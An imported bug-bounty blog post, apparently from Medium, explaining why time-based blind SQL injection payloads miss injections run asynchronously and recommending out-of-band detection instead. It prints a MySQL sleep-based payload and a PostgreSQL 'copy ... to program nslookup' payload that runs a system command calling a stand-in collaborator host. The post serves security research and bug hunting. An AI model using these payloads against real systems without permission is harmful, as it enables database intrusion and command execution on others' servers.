---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-06-08_super-blind-sql-injection-20000-bounty-thousands-of-targets-still-vulnerable.md
original_filename: 2024-06-08_super-blind-sql-injection-20000-bounty-thousands-of-targets-still-vulnerable.md
title: Super Blind SQL Injection- $20000 bounty | Thousands of targets still vulnerable
category: documents
detected_topics:
- sqli
- xss
- command-injection
tags:
- imported
- documents
- sqli
- xss
- command-injection
language: en
raw_sha256: aebd79d6be30369a567537f788469388c12f98b4f165ce21ace141fc3e99675c
text_sha256: ab0cc3d716c7367958dd1de8a37d58dc5d12abf5a50c5a734461e1f0c660546e
ingested_at: '2026-06-28T07:32:34Z'
sensitivity: unknown
redactions_applied: false
---

# Super Blind SQL Injection- $20000 bounty | Thousands of targets still vulnerable

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-06-08_super-blind-sql-injection-20000-bounty-thousands-of-targets-still-vulnerable.md
- Source Type: markdown
- Detected Topics: sqli, xss, command-injection
- Ingested At: 2026-06-28T07:32:34Z
- Redactions Applied: False
- Raw SHA256: `aebd79d6be30369a567537f788469388c12f98b4f165ce21ace141fc3e99675c`
- Text SHA256: `ab0cc3d716c7367958dd1de8a37d58dc5d12abf5a50c5a734461e1f0c660546e`


## Content

---
title: "Super Blind SQL Injection- $20000 bounty | Thousands of targets still vulnerable"
url: "https://medium.com/@pranshux0x/super-blind-sql-injection-20000-bounty-thousands-of-targets-still-vulnerable-f9b013765448"
authors: ["Priyanshu Shakya (@pranshux0x)"]
bugs: ["SQL injection"]
bounty: "20,000"
publication_date: "2024-06-08"
added_date: "2024-08-26"
source: "pentester.land/writeups.json"
original_index: 257
scraped_via: "browseros"
---

# Super Blind SQL Injection- $20000 bounty | Thousands of targets still vulnerable

Top highlight

Super Blind SQL Injection- $20000 bounty | Thousands of targets still vulnerable
priyanshu shakya
Follow
3 min read
·
Jun 8, 2024

795

9

Press enter or click to view image in full size
Core Concept

Time Based SQL Injection payload failed to detect SQL injection

XOR(if(now()=sysdate(),sleep(5),0))XOR

even though target is vulnerable with SQL injection.

OAST based SQL Injection payload detect it, but why ????.

copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
Idea

I saw this tweet of Kanhaiya Sharma (the legend)

here bro mention the time based SQL injection payload

XOR(if(now()=sysdate(),sleep(5),0))XOR

I find so many SQL injections with his payload.

So I start loving SQL Injections, to improve my knowledge more I revisit the portswigger labs of sqli.

Lots of labs solved with above mentioned time based SQL injection payload

XOR(if(now()=sysdate(),sleep(5),0))XOR

but this lab not solved with time based SQL injection payloads.

Lab: Blind SQL injection with out-of-band interaction | Web Security Academy
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and…

portswigger.net

If the code is vulnerable with SQL Injection, then time based SQL Injection payload must work . I contact lot of other hackers of the community ( pro ones also ) , and ask if the code is vulnerable with SQL Injection, then it’s possible that time based payload will not detect sqli— everyone say it’s impossible that time based payload will not detect sqli.

Get priyanshu shakya’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I check lot of other hacker intruder sql injection payload wordlist — but none of the hacker use SQL injection using out-of-band (OAST) techniques based payload.

This made me curious, because lot of hacker not using OAST based SQL Injection payload, and only OAST based sqli payload solve this portswigger lab, so it may be possible that there are other target in the wild that are vulnerable like this, but not detected by other hackers because they are not using OAST based sqli payload. But the question is why time based sqli paylaod not work , again I carefully read the portswigger sqli study material and I find out.

Answer is written in portswigger

An application might carry out the same SQL query as the previous example but do it asynchronously. The application continues processing the user’s request in the original thread, and uses another thread to execute a SQL query using the tracking cookie. The query is still vulnerable to SQL injection, but none of the techniques described so far will work.

Let me explain you what’s written here with example .

Did you ever hear about blind XSS , it’s same like that.

Let say you send the request to server

https://example.com/?q={sqli}

Server securely with parameterized query process the parameter and send you the response.

But then server saved the q parameter value {sqli} to database for maybe analytics purpose and now this time code is vulnerable with sqli injection.

But you will never detect this thing, with time based sqli payload. because you will get your response in a proper time.

But if you used OAST sqli payload here, you will get a dns interactions and you will detect that code is vulnerable with sql injection . OAST sqli paylod for PostgreSQL ( https://portswigger.net/web-security/sql-injection/cheat-sheet)

copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
Hunting

I start hunting with OAST sqli payload and find lots of sql injection that are not possible to find with time based sqli payload.

Total bounty I made with only OAST based SQL Injection is $20000 in 1 months.

Conclusion

Use OAST based sqli payload if you want more SQL Injections.

https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-using-out-of-band-oast-techniques
